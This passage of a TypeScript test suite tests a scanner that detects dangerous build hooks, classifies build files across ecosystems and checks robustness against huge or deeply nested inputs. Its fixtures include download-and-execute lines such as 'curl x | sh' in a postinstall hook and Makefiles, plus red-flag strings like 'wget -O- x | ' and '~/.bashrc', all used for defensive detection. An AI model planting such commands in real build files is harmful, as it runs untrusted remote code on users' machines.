    const o2 = run("node", { "package.json": pkg({ postinstall: "curl x | sh" }) });
    expect(rule(o2, "build-hooks/download-exec")[0]!.location).toBe("package.json:4");
    // a Makefile is not reported by the node recipe, so it is not scanned
    expect(run("node", { Makefile: "a:\n\tcurl x | sh\n" }).findings).toEqual([]);
    // a nested Makefile reported by `make` is scanned
    expect(rule(run("make", { Makefile: "a:\n", "sub/Makefile": "a:\n\tcurl x | sh\n" }), "build-hooks/download-exec")[0]!.location).toBe("sub/Makefile:2");
  });
});

describe("red flags: linear, unbypassable by length", () => {
  const time = (f: () => void) => {
    const t0 = performance.now();
    f();
    return performance.now() - t0;
  };
  const MB = 1_000_000;
  it.each(["curl ", "base64 ", "$HOME/.", "> /etc/", "wget -O- x | ", "cp ", "$( ", "`", "exec ", "~/.bashrc "])("a 1 MB line of repeated %j finishes quickly", (unit) => {
    const line = unit.repeat(Math.ceil(MB / unit.length));
    expect(time(() => scanRedFlags(line, false))).toBeLessThan(1000);
  });
  it("a 100,000-line file alternating decoders and non-executors finishes quickly", () => {
    const text = Array.from({ length: 100_000 }, (_, i) => (i % 2 ? "echo hello world" : "x = base64.b64decode(y)")).join("\n");
    expect(time(() => scanRedFlags(text, false))).toBeLessThan(1000);
  });
  it("100,000 continuation lines finish quickly", () => {
    expect(time(() => scanRedFlags("curl x \\\n".repeat(100_000), false))).toBeLessThan(1000);
  });
  it("many download segments finish quickly", () => {
    expect(time(() => scanRedFlags("curl a | tee | ".repeat(60_000), false))).toBeLessThan(1000);
  });
});

describe("file kinds and BUILD_FILE_PATTERNS", () => {
  const fixtures: Array<[string, string, Ecosystem[]]> = [
    ["package.json", "package.json", ["node"]],
    ["packages/a/package.json", "package.json", ["node"]],
    ["binding.gyp", "binding.gyp", ["node"]],
    [".pnpmfile.cjs", ".pnpmfile.cjs", ["node"]],
    [".yarnrc.yml", ".yarnrc.yml", ["node"]],
    [".yarnrc", ".yarnrc", ["node"]],
    [".npmrc", ".npmrc", ["node"]],
    ["pnpm-lock.yaml", "pnpm-lock.yaml", ["node"]],
    ["yarn.lock", "yarn.lock", ["node"]],
    ["setup.py", "setup.py", ["python"]],
    ["setup.cfg", "setup.cfg", ["python"]],
    ["pyproject.toml", "pyproject.toml", ["python"]],
    ["hatch.toml", "hatch.toml", ["python"]],
    ["hatch_build.py", "hatch_build.py", ["python"]],
    ["requirements.txt", "requirements.txt", ["python"]],
    ["meson.build", "meson.build", ["python"]],
    ["meson.options", "meson.options", ["python"]],
    ["meson_options.txt", "meson_options.txt", ["python"]],
    ["Cargo.toml", "Cargo.toml", ["rust", "python"]],
    ["crates/a/Cargo.toml", "Cargo.toml", ["rust"]],
    ["build.rs", "build.rs", ["rust", "python"]],
    ["crates/a/build.rs", "build.rs", ["rust"]],
    [".cargo/config.toml", ".cargo/config.toml", ["rust"]],
    [".cargo/config", ".cargo/config", ["rust"]],
    ["CMakeLists.txt", "CMakeLists.txt", ["cmake", "python"]],
    ["sub/CMakeLists.txt", "CMakeLists.txt", ["cmake"]],
    ["cmake/x.cmake", "*.cmake", ["cmake"]],
    ["configure", "configure", ["autotools"]],
    ["configure.ac", "configure.ac", ["autotools"]],
    ["Makefile.am", "Makefile.am", ["autotools"]],
    ["Makefile.in", "Makefile.in", ["autotools"]],
    ["aclocal.m4", "*.m4", ["autotools"]],
    ["Makefile", "Makefile", ["make", "autotools", "go"]],
    ["sub/makefile", "makefile", ["make"]],
    ["GNUmakefile", "GNUmakefile", ["make", "go"]],
    ["rules.mk", "*.mk", ["make"]],
    ["sub/rules.mk", "*.mk", ["make"]],
    ["Gemfile", "Gemfile", ["ruby"]],
    ["x.gemspec", "*.gemspec", ["ruby"]],
    ["ext/extconf.rb", "extconf.rb", ["ruby"]],
    ["Rakefile", "Rakefile", ["ruby"]],
    ["lib/Rakefile", "Rakefile", ["ruby"]],
  ];
  it.each(fixtures)("classifies %s as %s for %j", (path, kind, ecos) => {
    expect(fileKind(path)).toBe(kind);
    const entry = BUILD_FILE_PATTERNS.find((e) => e.pattern === kind)!;
    expect(entry).toBeDefined();
    for (const e of ecos) expect(entry.ecosystems).toContain(e);
  });
  it("does not classify root-only kinds below the root, or unrelated files", () => {
    for (const p of ["sub/.npmrc", "sub/setup.py", "sub/pyproject.toml", "sub/configure", "sub/.cargo/config.toml", "README.md", "Cargo.lock", "x/foo.m4", "sub/Gemfile", "sub/a.gemspec", ".cmake", ".mk", "mk"]) {
      expect(fileKind(p), p).toBeUndefined();
    }
  });
  it("every entry is expressible as a busybox find -name / -path test or a root [ -f ] check", () => {
    for (const e of BUILD_FILE_PATTERNS) {
      expect(["name", "glob", "path"]).toContain(e.kind);
      if (e.kind === "glob") expect(e.pattern).toMatch(/^\*\.[\w]+$/);
      else expect(e.pattern).toMatch(/^[\w.\-/]+$/);
      if (e.kind === "path") expect(e.rootOnly).toBe(true);
      expect(e.ecosystems.length).toBeGreaterThan(0);
    }
    expect(new Set(BUILD_FILE_PATTERNS.map((e) => e.pattern)).size).toBe(BUILD_FILE_PATTERNS.length);
  });
  it("the incomplete rules use the same table", () => {
    // every kind a skipped link could be: each makes exactly its ecosystems incomplete
    for (const [path, , ecos] of fixtures) {
      for (const eco of ["node", "python", "rust", "go", "ruby", "cmake", "autotools", "make", "generic"] as Ecosystem[]) {
        const o = run(eco, {}, { skippedLinks: [path] });
        expect(o.status === "incomplete", `${eco} ${path}`).toBe(fileKindReads(path, eco));
        if (ecos.includes(eco) && fileKind(path)) expect(fileKindReads(path, eco)).toBe(true);
      }
    }
  });
  it("exports PRUNE_DIRS", () => {
    expect([...PRUNE_DIRS]).toEqual([".git", "node_modules", "target", "vendor", ".venv", "venv", "__pycache__"]);
  });
});

function fileKindReads(path: string, eco: Ecosystem): boolean {
  const kind = fileKind(path);
  return !!kind && BUILD_FILE_PATTERNS.find((e) => e.pattern === kind)!.ecosystems.includes(eco);
}

describe("hostile TOML", () => {
  it.each([
    ["pyproject.toml", "python"],
    ["Cargo.toml", "rust"],
    [".cargo/config.toml", "rust"],
  ] as Array<[string, Ecosystem]>)("deeply nested %s does not throw", (path, eco) => {
    const deep = `a = ${"[".repeat(100_000)}`;
    const o = run(eco, { [path]: deep });
    expect(o.status).toBe("incomplete");
    const o2 = run(eco, { [path]: `${"[a]\n".repeat(10)}x = ${"{a=".repeat(50_000)}` });
    expect(o2.status).toBe("incomplete");
  });
  it("a hatch.toml with deep nesting does not throw", () => {
    expect(run("python", { "hatch.toml": `a = ${"[".repeat(100_000)}` }).status).toBe("incomplete");
  });
});
